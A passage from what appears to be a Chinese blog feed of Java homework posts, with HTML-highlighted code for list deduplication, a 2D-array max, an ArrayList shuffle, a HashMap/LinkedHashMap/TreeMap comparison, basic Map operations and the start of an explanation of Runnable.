        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            action<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="arraylist中的不同元素编写以下方法返回一个新的arraylist-新的列表中包含来自原列表中的不重复元素"><a class="markdownIt-Anchor" href="#arraylist中的不同元素编写以下方法返回一个新的arraylist-新的列表中包含来自原列表中的不重复元素"></a> (ArrayList中的不同元素)编写以下方法，返回一个新的ArrayList。新的列表中包含来自原列表中的不重复元素</h2>
<p><code>public static &lt;E&gt;ArrayList&lt;E&gt; removeDuplicates(ArrayList&lt;E&gt; list)</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">code</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedHashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">Consumer</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoveDuplicates</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayPre <span class="token operator">=</span> <span class="token class-name">GenerateRandomArray</span><span class="token punctuation">.</span><span class="token function">generateRandomArray</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> item <span class="token operator">:</span> arrayPre<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            array<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printAll</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> uniqueArray <span class="token operator">=</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"手动："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getAll</span><span class="token punctuation">(</span>uniqueArray<span class="token punctuation">,</span> element <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>element <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"哈希："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> uniqueArray1 <span class="token operator">=</span> <span class="token function">removeDuplicatesUsingHashSet</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getAll</span><span class="token punctuation">(</span>uniqueArray1<span class="token punctuation">,</span> element <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>element <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 手动去重</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> uniqueList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            uniqueList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> uniqueList<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">E</span> element <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printAll</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> uniqueList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>element <span class="token operator">==</span> uniqueList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> uniqueList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    uniqueList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> uniqueList<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 哈希去重</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token function">removeDuplicatesUsingHashSet</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">LinkedHashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> uniqueSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>uniqueSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">,</span> <span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">E</span> element <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            action<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> <span class="token function">printAll</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">getAll</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> element <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>element <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二维数组中的最大元素编写一个泛型方法返回二维数组中的最大元素"><a class="markdownIt-Anchor" href="#二维数组中的最大元素编写一个泛型方法返回二维数组中的最大元素"></a> (二维数组中的最大元素)编写一个泛型方法，返回二维数组中的最大元素</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span> <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">E</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>list <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> list<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">E</span> max <span class="token operator">=</span> list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">[</span><span class="token punctuation">]</span> es <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">E</span> es2 <span class="token operator">:</span> es<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>es2 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>max <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> es2<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                max <span class="token operator">=</span> es2<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> max<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="打乱arraylist编写以下方法打乱arraylist"><a class="markdownIt-Anchor" href="#打乱arraylist编写以下方法打乱arraylist"></a> (打乱ArrayList)编写以下方法，打乱ArrayList</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">code</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayShuffle</span> <span class="token punctuation">{</span>
    <span class="token comment">// Fisher-Yates洗牌算法，这个算法在原地打乱数组。每次随机交换两张牌</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个Random对象用于生成随机数</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 生成一个随机索引，该索引位于[0, i]范围内</span>
            <span class="token keyword">int</span> randomIndex <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 交换list[i]和list[randomIndex]的元素</span>
            <span class="token class-name">E</span> temp <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            list<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>randomIndex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            list<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>randomIndex<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个包含整数的ArrayList</span>
        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 打印原始列表</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Original list: "</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 打乱列表</span>
        <span class="token function">shuffle</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 打印打乱后的列表</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Shuffled list: "</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-10</title>
    <url>/2023/11/23/05-41-55/</url>
    <content><![CDATA[<p>数据结构相关</p>
<span id="more"></span>
<h2 id="描述并比较散列映射表hashmap-链式散列映射表linkedhashmap和树形映射表treemap"><a class="markdownIt-Anchor" href="#描述并比较散列映射表hashmap-链式散列映射表linkedhashmap和树形映射表treemap"></a> 描述并比较散列映射表HashMap、链式散列映射表LinkedHashMap和树形映射表TreeMap</h2>
<table>
<thead>
<tr>
<th>特性</th>
<th>HashMap</th>
<th>LinkedHashMap</th>
<th>TreeMap</th>
</tr>
</thead>
<tbody>
<tr>
<td>内部数据结构</td>
<td>基于散列 (哈希表)</td>
<td>哈希表 + 双向链表</td>
<td>红黑树</td>
</tr>
<tr>
<td>顺序</td>
<td>无序</td>
<td>插入顺序或访问顺序</td>
<td>自然排序或自定义排序</td>
</tr>
<tr>
<td>Key-Value对的唯一性</td>
<td>唯一的Key，可以有null的Key和Value</td>
<td>唯一的Key，可以有null的Key和Value</td>
<td>唯一的Key，不允许null的Key，可以有null的Value</td>
</tr>
<tr>
<td>性能</td>
<td>插入、删除、定位速度快</td>
<td>略慢于HashMap (因为维护了链表)</td>
<td>由于红黑树的特性，插入、删除、搜索的时间复杂度为 O(log n)</td>
</tr>
<tr>
<td>适用场景</td>
<td>需要快速查找且不关心顺序的场景</td>
<td>需要保持映射的插入顺序或访问顺序</td>
<td>需要一个按照自然顺序或自定义顺序排序的映射表</td>
</tr>
<tr>
<td>迭代器行为</td>
<td>效率较高，但在迭代过程中修改映射可能导致迭代器快速失败</td>
<td>效率略低，但在迭代过程中修改映射不会影响迭代器</td>
<td>效率取决于树的平衡程度，迭代器在修改映射时快速失败</td>
</tr>
<tr>
<td>注意</td>
<td>适用于对插入和查找操作有高性能要求的场景。注意在多线程环境下，HashMap 不是线程安全的，需要额外的同步措施。</td>
<td>当需要保持映射的插入顺序或访问顺序时使用。性能略低于 HashMap，但提供了顺序性。</td>
<td>当需要一个按照排序顺序来存储键值对的映射时使用，例如范围查找或排序输出。注意 TreeMap 的键需要具有可比性，要么实现 Comparable 接口，要么在构造 TreeMap 时提供 Comparator。</td>
</tr>
</tbody>
</table>
<h2 id="如何创建map的一个实例如何向由键和值组成的映射表中添加一个条目如何从映射表中删除一个条目如何获取映射表的大小如何遍历映射表中的条目"><a class="markdownIt-Anchor" href="#如何创建map的一个实例如何向由键和值组成的映射表中添加一个条目如何从映射表中删除一个条目如何获取映射表的大小如何遍历映射表中的条目"></a> 如何创建Map的一个实例？如何向由键和值组成的映射表中添加一个条目？如何从映射表中删除一个条目？如何获取映射表的大小？如何遍历映射表中的条目？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建Map实例</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">KeyType</span><span class="token punctuation">,</span> <span class="token class-name">ValueType</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建 HashMap 实例</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">KeyType</span><span class="token punctuation">,</span> <span class="token class-name">ValueType</span><span class="token punctuation">&gt;</span></span> linkedHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建 LinkedHashMap 实例</span>
<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">KeyType</span><span class="token punctuation">,</span> <span class="token class-name">ValueType</span><span class="token punctuation">&gt;</span></span> treeMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建 TreeMap 实例</span>
<span class="token comment">// KeyType 和 ValueType 分别代表映射表中键和值的类型。</span>

<span class="token comment">// 向映射表中添加一个条目</span>
map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加或更新键值对</span>
<span class="token comment">// 如果映射表中已存在相同的键，这个方法会更新其对应的值。</span>

<span class="token comment">// 从映射表中删除一个条目</span>
map<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除指定键的条目</span>
这个方法会删除映射表中与指定键关联的条目。

<span class="token comment">// 获取映射表的大小</span>
<span class="token keyword">int</span> size <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取映射表中的条目数</span>

<span class="token comment">// 遍历映射表中的条目</span>
<span class="token comment">// for-each 循环遍历</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">KeyType</span><span class="token punctuation">,</span> <span class="token class-name">ValueType</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">KeyType</span> key <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ValueType</span> value <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 处理键和值</span>
<span class="token punctuation">}</span>
<span class="token comment">// 使用 Java8 的 forEach 方法遍历</span>
map<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 处理键和值</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="什么是可运行对象线程是什么"><a class="markdownIt-Anchor" href="#什么是可运行对象线程是什么"></a> 什么是可运行对象？线程是什么？</h2>
<ul>
<li>
<p>可运行对象<br>
在 Java 中，可运行对象（Runnable object）通常是指实现了 Runnable 接口的类的实例。Runnable 接口是一个函数式接口，它只有一个没有参数的方法 run()。当一个类实现了这个接口，它就需要提供 run() 方法的实现。这个 run() 方法定义了当线程启动时要执行的操作。<br>
